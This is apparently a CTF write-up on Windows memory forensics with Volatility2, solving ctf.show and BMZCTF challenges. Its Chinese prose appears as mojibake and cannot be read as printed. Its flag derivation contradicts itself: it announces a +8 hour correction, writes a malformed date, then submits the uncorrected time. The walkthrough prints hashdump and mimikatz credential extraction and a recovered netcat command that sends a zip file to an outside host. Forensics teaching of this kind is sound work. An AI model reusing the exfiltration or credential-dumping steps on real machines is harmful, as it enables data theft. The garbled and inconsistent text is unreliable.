# å†…å­˜å–è¯

å·¥å…·ï¼šVolatility2

è½¯ä»¶å¯ä»¥é€šè¿‡githubä¸‹è½½ éœ€è¦é…ç½®python2ä¸pip2ç¯å¢ƒ

`https://github.com/volatilityfoundation/volatility`

![](https://camo.githubusercontent.com/eeafeeaf1e41ff270b6f855ae44bfd1561649ae5395ca3a11c8c951cbc7ba58b/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f37613838393866636331623134623535623764343831306333306666353638392e706e67)

å¦‚æœç³»ç»Ÿä¸ºArchLinuxå¯ä»¥é€šè¿‡aurå®‰è£…

`yay python2-volatility`

## å·¥å…·ä½¿ç”¨æ–¹æ³•				

| å‘½ä»¤              | æ•ˆæœ                                     |
| ----------------- | ---------------------------------------- |
| -f                | å¼•å…¥é•œåƒ                                 |
| imageinfo         | æŸ¥è¯¢é•œåƒè¯¦ç»†ä¿¡æ¯                         |
| --profile=sysinfo | ä½¿ç”¨ä½•ç§é…ç½®æ–‡ä»¶                         |
| pslist            | [æ’ä»¶]éå†å†…å­˜é•œåƒä¸­çš„è¿›ç¨‹               |
| procdump          | [æ’ä»¶]æå–å†…å­˜é•œåƒä¸­çš„è¿›ç¨‹å¹¶ä¸”ä¿å­˜æˆæ–‡ä»¶ |
| cmdscan           | [æ’ä»¶]æå–å·²æ‰§è¡Œçš„cmdå‘½ä»¤                |
| cmdline           | [æ’ä»¶]æå–å‘½ä»¤è¡Œå‚æ•°ä¸å‚æ•°å€¼             |
| filescan          | [æ’ä»¶]æŸ¥è¯¢å·²ç»æ‰“å¼€çš„æ–‡ä»¶ è·å¾—è¯¦ç»†ä¿¡æ¯    |
| dumpfiles         | [æ’ä»¶]æå–ç³»ç»Ÿå†…å­˜ä¸­çš„æ–‡ä»¶               |
| hashdump          | [æ’ä»¶]æå–ç³»ç»Ÿå†…å­˜ä¸­å¯†ç çš„hashå€¼         |
| mimikatz          | [æ’ä»¶]ç›´æ¥æå–å†…å­˜ä¸­çš„æ˜æ–‡å¯†ç            |
| clipboard         | [æ’ä»¶]æå–å‰ªè´´æ¿æ•°æ®                     |
| svcscanp          | [æ’ä»¶]æ‰«æè¿›ç¨‹ä¸­æ‰€æœ‰çš„æœåŠ¡               |
| netscan           | [æ’ä»¶]æ‰«æå†…å­˜ä¸­çš„ç½‘ç»œè¿æ¥å’Œå¥—æ¥å­—       |
| printkey          | [æ’ä»¶]æ³¨å†Œè¡¨åˆ†æ_é”®å€¼                    |
| hivelist          | [æ’ä»¶]æ³¨å†Œè¡¨åˆ†æ_åœ°å€                    |
| hivedump          | [æ’ä»¶]æ³¨å†Œè¡¨åˆ†æ_dumpæ•°æ®                |
| timeliner         | åˆ›å»ºå†…å­˜ä¸­çš„ç—•è¿¹æ—¶é—´çº¿                   |
| nodepad           | æŸ¥çœ‹è®°äº‹æœ¬å½“å‰æ˜¾ç¤ºçš„æ–‡æœ¬                 |

## è¯¦ç»†ä½¿ç”¨

æ— è®ºæ‹¿åˆ°æ‰«ææ ·å­çš„é¢˜ç›®ç¬¬ä¸€æ­¥éƒ½æ˜¯æŸ¥çœ‹ç³»ç»Ÿé•œåƒï¼Œåˆ©ç”¨imageinfoæŸ¥çœ‹è¯¦ç»†é•œåƒä¿¡æ¯

`vol.py -f 1.vmem imageinfo`

```shell
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/neko/Desktop/1.vmem)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80003e520a0L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80003e53d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2021-04-21 07:24:54 UTC+0000
     Image local date and time : 2021-04-21 15:24:54 +0800

```

é€šè¿‡æŸ¥çœ‹Suggested Profile(s)å­—æ®µç¡®å®šéœ€è¦ä½¿ç”¨çš„å†…å­˜é•œåƒåˆ†æé…ç½®æ–‡ä»¶

`vol.py -f 1.vmem --profile=Win7SP1x64 pslist`



```shell
Volatility Foundation Volatility Framework 2.6
Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0xfffffa8018db89e0 System                    4      0     74      562 ------      0 2021-04-21 07:16:07 UTC+0000                                 
0xfffffa801a449040 smss.exe                224      4      2       29 ------      0 2021-04-21 07:16:07 UTC+0000                                 
0xfffffa801ab72b30 csrss.exe               308    300      9      473      0      0 2021-04-21 07:16:08 UTC+0000                                 
0xfffffa8018dbd5f0 wininit.exe             344    300      3       75      0      0 2021-04-21 07:16:08 UTC+0000                                 
0xfffffa801ab82060 csrss.exe               356    336      8      315      1      0 2021-04-21 07:16:08 UTC+0000                                 
0xfffffa801abbf060 winlogon.exe            404    336      7      131      1      0 2021-04-21 07:16:08 UTC+0000                                 ..........
```

å€¼å¾—æ³¨æ„çš„æ˜¯pidæ•°å­—ï¼Œå¯ä»¥é€šè¿‡å®ƒdumpå‡ºå†…å­˜ä¸­çš„ç¨‹åº

`vol.py -f 1.vmem --profile=Win7SP1x64 procdump -p 224 -D ./`

pï¼šå°±æ˜¯pidè¿›ç¨‹å·

Dï¼šæå–ç¨‹åºåä¿å­˜çš„ä½ç½®ï¼Œ./å°±æ˜¯ä¿å­˜åˆ°å½“å‰ä½ç½®

```shell
Volatility Foundation Volatility Framework 2.6
Process(V)         ImageBase          Name                 Result
------------------ ------------------ -------------------- ------
0xfffffa801a449040 0x0000000048490000 smss.exe             OK: executable.224.exe
```

### æ£€ç´¢ç»ˆç«¯ä¿¡æ¯

volä¸­å¯ä»¥ä½¿ç”¨cmdscanæ‰«æå†…å­˜é•œåƒä¸­å·²ç»æ‰§è¡Œçš„cmdå‘½ä»¤

`vol.py -f 1.vmem --profile=Win7SP1x64 cmdscan`

```shell
Volatility Foundation Volatility Framework 2.6
**************************************************
CommandProcess: conhost.exe Pid: 3400
CommandHistory: 0x317540 Application: cmd.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x5c
**************************************************
CommandProcess: conhost.exe Pid: 3400
CommandHistory: 0x317720 Application: csrss.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x88
```

è¿™ä¸ªé•œåƒå¹¶æ²¡æœ‰è¯¦ç»†ä¿¡æ¯ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹å…¶ä»–é•œåƒ

![](https://camo.githubusercontent.com/174849bf730a63d69775ef2744ca8922dba97719f3da5435e1e2f7f1fd4fefa3/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f31613239346533333533353334643533616366626334643638313933353230332e706e67)





## é¢˜ç›®å®ä¾‹

é¢˜ç›®åœ°å€ï¼šhttps://ctf.show/challenges#JiaJia-CP-1-1734

è¯¦ç»†ï¼š

```
è¿™æ˜¯éƒ¨åˆ†äººç†ŸçŸ¥çš„**åˆ˜ä½³ä½³**åŒå­¦çš„ç”µè„‘ï¼Œå¥¹ä»Šå¹´21å²å·²åœ¨å…¬å¸é‡Œå®ä¹ ã€‚ä½†æ˜¯ä½³ä½³ç»å¸¸æ‘¸é±¼è¢«è€æ¿è®­æ–¥è¯´ï¼š"ä½ æ€ä¹ˆæ‘¸å¾—ä¸‹å»çš„"ã€‚å› æ­¤ä½³ä½³è¿˜ä¼šç»å¸¸å°†æœªå®Œæˆçš„å·¥ä½œå¸¦åˆ°å®¶é‡Œå»å®Œæˆ(~~è€æ¿ä¸ç•™å¥¹åŠ ç­å±å®æœ‰ç‚¹ç¦»è°±~~ã€‚ä½†æœ€è¿‘ä½³ä½³ä¸€å¤©æ‘¸é±¼çš„æ—¶é—´è¾¾åˆ°äº†25å°æ—¶ï¼Œè¿™ä»¤è€æ¿éå¸¸ä¸çˆ½ã€‚äºæ˜¯ğŸ•è€æ¿æ‚„æ‚„çš„æ¤å…¥äº†ä¸€ä¸ªè½¯ä»¶å¹¶åœ¨åå°è·å–äº†ä½³ä½³**ç”µè„‘çš„å†…å­˜ä¿¡æ¯**ã€‚ç”±äºè€æ¿ä¹Ÿæ˜¯ä¸ªæ‡’ğŸ•äºæ˜¯å«ä½ æ¥æ‰¾ä¸€ä¸‹è€æ¿æƒ³è¦çš„ä½³ä½³ç”µè„‘çš„ä¿¡æ¯ã€‚ä½œä¸ºåå¹´è€ç²‰çš„CTFerä»¬å¦‚æœä¸æ˜¯å› ä¸ºè¦æ‰¾åˆ°flagä¸€å®šä¸æƒ³å¸®è€æ¿æ¥çœ‹ä½³ä½³çš„ç”µè„‘å†…å­˜ä¿¡æ¯å§ï¼Œäºæ˜¯ä½ ä¹Ÿåªèƒ½æ¥å¸®åŠ©è€æ¿å¯»æ‰¾ä½³ä½³ç”µè„‘é‡Œçš„ä¿¡æ¯ã€‚~~ç”µè„‘é‡Œé¢æ²¡æœ‰å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼Œä¸è¦ä¹±ç¿»æµªè´¹æ—¶é—´~~
é¢˜ç›®è§£å‹å¯†ç ï¼šTh1s_15_p@SsW0rd_u_n3ver_kn0w_b3f0re_BLB_St4rt

å¯é€šè¿‡éªŒè¯å‹ç¼©åŒ…md5å€¼æŸ¥çœ‹é™„ä»¶æ˜¯å¦æŸåï¼šde3b3febacdfa20d255e1014cd204a35

å…±3å¤§é¢˜ï¼Œç¬¬1å¤§é¢˜åšå‡ºæ¥å†ç»™ä½ ç¬¬2å¤§é¢˜å’Œç¬¬3å¤§é¢˜çš„é¢˜ç›®ï¼Œå“¼å“¼

1.ä½³ä½³çš„ç”µè„‘ç”¨æˆ·åå«ä»€ä¹ˆ(å³C:\Users\{name})

2.æœ€åä¸€æ¬¡è¿è¡Œè®¡ç®—å™¨çš„æ—¶é—´ï¼Ÿ(æ ¼å¼ä¸ºyyyy-mm-dd_hh:mm:ssï¼Œæ³¨æ„å†’å·ä¸ºè‹±æ–‡å†’å·)

flagæ ¼å¼ä¸ºctfshow{md5(A1_A2)}ï¼Œ format:ctfshow{ljj_2021-12-12_07:13:26}=ctfshow{c3cf135599d338093cbd2b578065be89}**

google cloudé“¾æ¥https://drive.google.com/file/d/1UvMTUXV76F-qh1FGtUpE_duo3V7cgO1f/view

duç›˜é“¾æ¥https://pan.baidu.com/s/1hVFPJhU8B4g8Kyy0ssDSLw?pwd=show

æå–ç ï¼šshow
```

å…ˆçœ‹é¢˜ç›®ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å‡ºé•œåƒæ–‡ä»¶ä¸­ä½³ä½³çš„ç”¨æˆ·åä¸æœ€åä¸€æ¬¡è¿è¡Œè®¡ç®—æœºçš„æ—¶é—´ï¼ŒäºŒè€…ç»“åˆè®¡ç®—md5

å…ˆçœ‹ç¬¬ä¸€é¢˜ï¼Œéœ€è¦æˆ‘ä»¬æ‰¾å‡ºUsersä¸‹çš„ä½³ä½³çš„ç”¨æˆ·åï¼Œè¿™é‡Œå¯ä»¥ç”¨åˆ°filescanæ’ä»¶é…åˆgrepè¾“å‡ºæ¥æŸ¥è¯¢

`vol.py -f JiaJia_Co.raw --profile=Win7SP1x64 filescan | grep Users`

```shell
0x000000013fdd8930     16      0 RW---- \Device\HarddiskVolume1\Users\JiaJia\AppData\Roaming\Telegram Desktop\Updater.exep
0x000000013fdda070     16      0 R--r-- \Device\HarddiskVolume1\Users\JiaJia\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\6025C34CC5B36C4156C40F3B0D99B6AB
0x000000013fde26a0     16      0 RW---- \Device\HarddiskVolume1\Users\JiaJia\AppData\Roaming\Telegram Desktop\Telegram.exe
0x000000013fde46d0      3      0 R--rw- \Device\HarddiskVolume1\Users\JiaJia\AppData\Local\Google\Chrome\User Data\Safe Browsing\UrlSoceng.store
0x000000013fde4930     16      0 R--r-- \Device\HarddiskVolume1\Users\JiaJia\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\F07644E38ED7C9F37D11EEC6D4335E02_E81D30836CB09660A7E3C5D921621623
0x000000013fded350     16      0 RW-rw- 
```

![](https://picdm.sunbangyan.cn/2023/11/23/d61815de9a845dea4420fe8809ca84a4.jpeg)

å¯çŸ¥ç”¨æˆ·åä¸ºJiaJia

ç¬¬äºŒé¢˜éœ€è¦æˆ‘ä»¬æ‰¾å‡ºè®¡ç®—å™¨â€”â€”ä¹Ÿå°±æ˜¯calc.exeï¼Œæˆ‘ä¹‹å‰çš„æ€è·¯æ˜¯æŸ¥è¯¢pslistæˆ–è€…filescanè¿‡æ»¤å‡ºcalcå­—ç¬¦ï¼Œç»“æœä¸è¡Œ

pslistå®Œå…¨æ²¡æœ‰è¾“å‡º	filescanå€’æ˜¯æœ‰è¾“å‡ºäº†ä½†æ˜¯æ²¡æœ‰æ—¶é—´ä¿¡æ¯

![](https://picdl.sunbangyan.cn/2023/11/23/d71a8ffcc424d0b6f1c1af70621c863e.jpeg)

åç»­åœ¨å¤§ä½¬çš„ç‚¹æ‹¨ä¸‹æ‰¾åˆ°äº†è¿™æ ·ä¸€ä¸ªå‘½ä»¤

![](https://picss.sunbangyan.cn/2023/11/23/444963a243f053b64eab22e9d1e6fc23.jpeg)

timelinerå¯ä»¥æ¢³ç†å‡ºå†…å­˜ä¸­ä¿¡æ¯çš„æ—¶é—´çº¿ é…åˆè¿‡æ»¤å‘½ä»¤ å°±æ˜¯

`vol.py -f JiaJia_Co.raw --profile=Win7SP1x64 timeliner | grep calc.exe`

![](https://picss.sunbangyan.cn/2023/11/23/9d3d4593d99b481df96c6ebc46e2bd27.jpeg)

å¾—åˆ°æ—¶é—´ä¿¡æ¯ï¼š2021-12-10 12:15:47

ä½†æ˜¯å› ä¸ºwindowså’Œlinuxçš„å·®å¼‚æ—¶é—´ç›¸å·®äº†8ä¸ªå°æ—¶ï¼Œä¹Ÿå°±æ˜¯æ—¶é—´éœ€è¦+8

å› æ­¤æ­£ç¡®æ—¶é—´åº”è¯¥æ˜¯ï¼š2021-12-10 20:15:47

flagæ ¼å¼ä¸ºctfshow{md5(A1_A2)}ï¼Œ format:ctfshow{ljj_2021-12-12_07:13:26}=ctfshow{c3cf135599d338093cbd2b578065be89}

JiaJia_2021-20-10_20:15:47

ctfshow{JiaJia_2021-12-10_12:15:47}

ctfshow{079249e3fc743bc2d0789f224e451ffd}

æ­£ç¡®é€šè¿‡ã€‚ã€‚ã€‚

## BMZCTF å†…å­˜å–è¯

```
[BMZCTF]å†…å­˜å–è¯ä¸‰é¡¹
é¢˜ç›®æè¿°ï¼šä¸€å¤©ä¸‹åˆå°ç™½å‡ºå»åƒé¥­ï¼Œä¸´èµ°ä¹‹å‰è¿˜ä¸å¿˜é”äº†ç”µè„‘ï¼Œè¿™æ—¶åŒå¯å®¤çš„å°é»‘æƒ³æç‚¹äº‹æƒ…ï¼Œæ‡‚ç‚¹é»‘å®¢å’Œç¤¾å·¥çŸ¥è¯†çš„å°é»‘ç»è¿‡å¤šæ¬¡å°è¯•è·å¾—äº†å¯†ç æˆåŠŸè¿›å…¥ç”µè„‘ï¼Œäºæ˜¯ä¾¿æ‚„æ‚„åœ¨ç”µè„‘ä¸ŠåŠ¨èµ·æ‰‹è„šäº†ï¼Œä¾¿åœ¨æ¡Œé¢ä¸Šå†™ç€ä»€ä¹ˆï¼Œæƒ³ç»™å°ç™½ä¸€ä¸ªæƒŠå–œï¼ŒåŒæ—¶è¿˜ä¼ é€ç€å°ç™½çš„æœºå¯†æ–‡ä»¶ï¼Œæ­£å·§è¿™æ—¶å°ç™½åˆšå¥½å›æ¥ï¼Œä¸¤äººéƒ½å“äº†ä¸€è·³ï¼Œå°é»‘ä¹Ÿä¸ç®¡è‡ªå·±åœ¨ç”µè„‘ä¸Šç•™ä¸‹çš„æ“ä½œæ€¥å¿™ç¦»å¼€ç”µè„‘ï¼Œæ•…ä½œæ·¡å®šçš„è¯´ï¼šâ€œæˆ‘å°±æ˜¯éšä¾¿çœ‹çœ‹â€ã€‚
1.å°é»‘å†™çš„å•¥ï¼Œæ®è¯´æ˜¯flagï¼Ÿ
2.é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå°ç™½çš„å¯†ç æ˜¯å•¥ï¼Ÿ
3.å°é»‘å‘é€çš„æœºå¯†æ–‡ä»¶é‡Œé¢åˆ°åº•æ˜¯ä»€ä¹ˆ
```

æ‹¿åˆ°é¢˜ç›®ï¼Œæ— è®ºå¦‚ä½•ï¼Œå…ˆçœ‹imageinfo

`vol.py -f L-12A6C33F43D74-20161114-125252.raw imageinfo` 

```shell
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/neko/Desktop/L-12A6C33F43D74-20161114-125252.raw)
                      PAE type : PAE
                           DTB : 0xb18000L
                          KDBG : 0x80545ce0L
          Number of Processors : 1
     Image Type (Service Pack) : 2
                KPCR for CPU 0 : 0xffdff000L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2016-11-14 12:52:58 UTC+0000
     Image local date and time : 2016-11-14 20:52:58 +0800
```

é€šè¿‡Suggestedç¡®å®šæˆ‘ä»¬éœ€è¦ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ä¸ºWinXPSP2x86

é¢˜ç›®å¯ä»¥çœ‹å‡ºå°é»‘å¹¶æ²¡æœ‰å…³é—­æ­£åœ¨å†™å…¥çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘å°±å¯ä»¥çœ‹çœ‹palistï¼Œçœ‹çœ‹èƒ½æ‰¾åˆ°äº›ä»€ä¹ˆä¿¡æ¯

`vol.py -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 pslist`

```shell
Volatility Foundation Volatility Framework 2.6
Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0x80eca020 System                    4      0     59      252 ------      0                                     
0x80d98b30 smss.exe                552      4      3       21 ------      0 2016-11-14 12:09:44 UTC+0000       
0xff70e918 csrss.exe               668    552     11      401      0      0 2016-11-14 12:09:47 UTC+0000       
0xff704da0 winlogon.exe            692    552     18      445      0      0 2016-11-14 12:09:48 UTC+0000       
0xff6eb490 services.exe            736    692     16      280      0      0 2016-11-14 12:09:49 UTC+0000       
0xff6e7770 lsass.exe               748    692     21      350      0      0 2016-11-14 12:09:49 UTC+0000       
0xff6d2b48 vmacthlp.exe            900    736      1       24      0      0 2016-11-14 12:09:50 UTC+0000       
0xff6b12c0 svchost.exe             928    736     17      193      0      0 2016-11-14 12:09:50 UTC+0000   
0xff69f1a8 svchost.exe             992    736     10      258      0      0 2016-11-14 12:09:51 UTC+0000       
0xff68d310 svchost.exe            1152    736     64     1217      0      0 2016-11-14 12:09:51 UTC+0000       
0xff6844c0 svchost.exe            1220    736      6       59      0      0 2016-11-14 12:09:51 UTC+0000       
0xff6773c8 svchost.exe            1360    736     14      208      0      0 2016-11-14 12:09:52 UTC+0000       
0xff655498 spoolsv.exe            1560    736     11      130      0      0 2016-11-14 12:09:53 UTC+0000       
0xff63e718 svchost.exe            1692    736      5       87      0      0 2016-11-14 12:10:11 UTC+0000       
0xff6383d0 VGAuthService.e        1756    736      2       61      0      0 2016-11-14 12:10:11 UTC+0000       
0xff61b4d8 vmtoolsd.exe           1932    736      8      251      0      0 2016-11-14 12:10:20 UTC+0000       
0xff5ea6b0 alg.exe                 308    736      6      105      0      0 2016-11-14 12:10:22 UTC+0000       
0xff5e89b0 wmiprvse.exe            316    928     12      233      0      0 2016-11-14 12:10:22 UTC+0000       
0xff5b8a48 explorer.exe           1416   1332     15      446      0      0 2016-11-14 12:10:26 UTC+0000       
0xff583a18 wscntfy.exe            1204   1152      1       44      0      0 2016-11-14 12:10:26 UTC+0000       
0xff56b1b0 rundll32.exe           1744   1416      4       78      0      0 2016-11-14 12:10:28 UTC+0000       
0xff56a3f8 vmtoolsd.exe           1704   1416      6      170      0      0 2016-11-14 12:10:28 UTC+0000       
0xff566da0 ctfmon.exe             1912   1416      1       89      0      0 2016-11-14 12:10:28 UTC+0000       
0x80d4bb28 wpabaln.exe            1992    692      1       66      0      0 2016-11-14 12:12:26 UTC+0000       
0xff5ee020 notepad.exe             280   1416      1       50      0      0 2016-11-14 12:20:27 UTC+0000       
0xff5c5020 cmd.exe                1568   1416      1       34      0      0 2016-11-14 12:23:34 UTC+0000       
0xff5b6448 conime.exe              860   1568      1       36      0      0 2016-11-14 12:23:34 UTC+0000       
0x80d4d7f0 wmiprvse.exe            856    928      6      135      0      0 2016-11-14 12:48:39 UTC+0000       
0xff555020 nc.exe                  120   1568      1       34      0      0 2016-11-14 12:50:28 UTC+0000       
0xff65c2a0 DumpIt.exe              392   1416      1       24      0      0 2016-11-14 12:52:52 UTC+0000       
```

æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªå€¼å¾—æ³¨æ„çš„æ–‡ä»¶ï¼Œnc.exeï¼Œcmd.exeï¼Œnotepad.exeï¼Œå‰ä¸¤ä¸ªæˆ‘ä»¬å…ˆä¸ç®¡ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹notepadéƒ½å†™äº†äº›ä»€ä¹ˆ

è¿™é‡Œå¯ä»¥ä½¿ç”¨notepadæ¨¡å—

`vol.py -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 notepad`

```shell
Volatility Foundation Volatility Framework 2.6
Process: 280
Text:
?
Text:
d
Text:

Text:
?
Text:
666C61677B57336C6563306D655F376F5F466F72336E356963737D
```

å‰é¢éƒ½ä¸é‡è¦ï¼Œæˆ‘ä»¬çœ‹æœ€åº•ä¸‹ä»–è¿”å›äº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒæŒ‰ç…§å½¢å¼çœ‹åº”è¯¥æ˜¯asciiç¼–ç çš„

è§£ç æˆ‘ä»¬å¯ä»¥ä½¿ç”¨pythonçš„binasciiæ¨¡å—ï¼Œä»–å…·æœ‰asciiä¸æ–‡æœ¬çš„è½¬æ¢åŠŸèƒ½

```shell
[neko@NekoArch Desktop]$ python 
Python 3.11.6 (main, Nov 14 2023, 09:36:21) [GCC 13.2.1 20230801] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from binascii import *
>>> a2b_hex("666C61677B57336C6563306D655F376F5F466F72336E356963737D")
b'flag{W3lec0me_7o_For3n5ics}'
>>> 
```

flag{W3lec0me_7o_For3n5ics}

flag1 get 

ç¬¬äºŒé¢˜æ˜¯è¦æˆ‘ä»¬æŸ¥è¯¢ç”¨æˆ·å¯†ç ï¼Œä¸€èˆ¬è€Œè¨€ç›´æ¥ä½¿ç”¨mimikatzå°±å¯ä»¥æŸ¥è¯¢åˆ°å¯†ç 

`vol.py -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 mimikatz`

ä½†æ˜¯ä¸æ¸…æ¥šæ˜¯ä¸æ˜¯é¢˜ç›®è®¾è®¡è€…çš„è®¡ç®—mimikatzä¼¼ä¹æ— æ³•åœ¨xpä¸Šè·å–ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†å°è¯•hashdumpæ¥è·å¾—hashåœ¨åˆ°äº’è”ç½‘ä¸ŠæŸ¥è¯¢

`vol.py -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 hashdump`

```shell
Volatility Foundation Volatility Framework 2.6
Administrator:500:1e27e87bd14ec8af43714428b303e3e4:1e581aafa474dfadfdf83fc31e4fd4ea:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:687255e91a0f559b6d75553dbd51f785:b6125736bdd2d5f154fdce59f52e39f1:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:fb41f8d1334fba131974c39bfab09512:::
```

å¯ä»¥æ‰¾åˆ°hashä¸ºï¼š1e581aafa474dfadfdf83fc31e4fd4ea

ä¸¤ä¸ªç½‘ç«™ï¼šhttps://www.cmd5.com/login.aspx https://crackstation.net/

crackstationä»€ä¹ˆéƒ½æ²¡æŸ¥å‡ºæ¥cmd5å€’æ˜¯æŸ¥å‡ºæ¥äº†

![](https://picdl.sunbangyan.cn/2023/11/26/03ff22def1abae3f71f2bff1bffe9e66.jpeg)

æˆ‘æ˜¯çœŸä¸æƒ³èŠ±å†¤æ‰é’±ã€‚ã€‚ã€‚ã€‚å°±å½“æˆ‘æŸ¥å‡ºæ¥äº†ç½¢

å¯†ç ï¼šflag{19950101}

flag2 get

æ¥åˆ°ç¬¬ä¸‰é¢˜ï¼Œä»–é—®æˆ‘ä»¬å°é»‘ä¼ è¾“äº†ä»€ä¹ˆæ–‡ä»¶ï¼Œè¿˜è®°å¾—æˆ‘ä»¬é€šè¿‡pslistæŸ¥è¯¢åˆ°çš„cmd.exeå’Œnc.exeå—ï¼Œè¿™é‡Œçš„æ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼Œé€šè¿‡cmdscanæ¥çœ‹çœ‹å°é»‘éƒ½æ‰§è¡Œäº†ä»€ä¹ˆå‘½ä»¤

`vol.py -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 cmdscan`

```shell
Volatility Foundation Volatility Framework 2.6
**************************************************
CommandProcess: csrss.exe Pid: 668
CommandHistory: 0x2da3850 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 3 LastAdded: 2 LastDisplayed: 2
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x3dc
Cmd #0 @ 0x56af00: ipconfig
Cmd #1 @ 0x56d650: cd C:\Program Files\Netcat
Cmd #2 @ 0x2da2e40: nc 192.168.57.14 2333 < P@ssW0rd_is_y0ur_bir7hd4y.zip
**************************************************
CommandProcess: csrss.exe Pid: 668
CommandHistory: 0x2dae628 Application: nc.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x1f0
Cmd #20 @ 0x180018: .4148
**************************************************
CommandProcess: csrss.exe Pid: 668
CommandHistory: 0x2ddea58 Application: DumpIt.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x164
```

è¿™é‡Œçš„å‘½ä»¤å¯ä»¥çœ‹å‡ºå°é»‘é€šè¿‡ncå‘½ä»¤å°†åä¸ºP@ssW0rd_is_y0ur_bir7hd4y.zipçš„å‹ç¼©åŒ…æ–‡ä»¶ä¼ è¾“åˆ°äº†ä¸€ä¸ªå†…ç½‘çš„æœºå™¨ä¸Šï¼Œé‚£æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡filescanåŠ ä¸Šgrepå‘½ä»¤è¿‡æ»¤æ–‡ä»¶åæ‰¾åˆ°æ–‡ä»¶åœ¨é€šè¿‡dumpfileå°†æ–‡ä»¶dumpå‡ºæ¥

```shell
[neko@NekoArch Desktop]$ vol.py -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 filescan | grep P@ssW0rd_is_y0ur_bir7hd4y.zip
Volatility Foundation Volatility Framework 2.6
0x0000000002c61318      3      1 R--rw- \Device\HarddiskVolume1\Program Files\Netcat\P@ssW0rd_is_y0ur_bir7hd4y.zip
[neko@NekoArch Desktop]$ vol.py -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002c61318 -D ./
Volatility Foundation Volatility Framework 2.6
DataSectionObject 0x02c61318   None   \Device\HarddiskVolume1\Program Files\Netcat\P@ssW0rd_is_y0ur_bir7hd4y.zip
SharedCacheMap 0x02c61318   None   \Device\HarddiskVolume1\Program Files\Netcat\P@ssW0rd_is_y0ur_bir7hd4y.zip
```

å°è¯•è§£å‹æ—¶æç¤ºæˆ‘ä»¬éœ€è¦å¯†ç 

```shell
[neko@NekoArch Desktop]$ unzip file.None.0xff6d3410.dat 
Archive:  file.None.0xff6d3410.dat
[file.None.0xff6d3410.dat] P@ssW0rd_is_y0ur_bir7hd4y.txt password:
```

ä¹‹å‰è·å–åˆ°äº†å°ç™½ç”µè„‘çš„å¯†ç ä¸ºflag{19950101}ï¼Œå°è¯•å–ä¸­é—´çš„å‡ºç”Ÿå¹´æœˆæ—¥ä¸ºå¯†ç 

```shell
[neko@NekoArch Desktop]$ unzip file.None.0xff6d3410.dat 
Archive:  file.None.0xff6d3410.dat
[file.None.0xff6d3410.dat] P@ssW0rd_is_y0ur_bir7hd4y.txt password: 
 extracting: P@ssW0rd_is_y0ur_bir7hd4y.txt 
[neko@NekoArch Desktop]$ cat P\@ssW0rd_is_y0ur_bir7hd4y.txt 
flag{Thi5_Is_s3cr3t!}
```

flag{Thi5_Is_s3cr3t!}

flag3 get

é¢˜è§£ã€‚

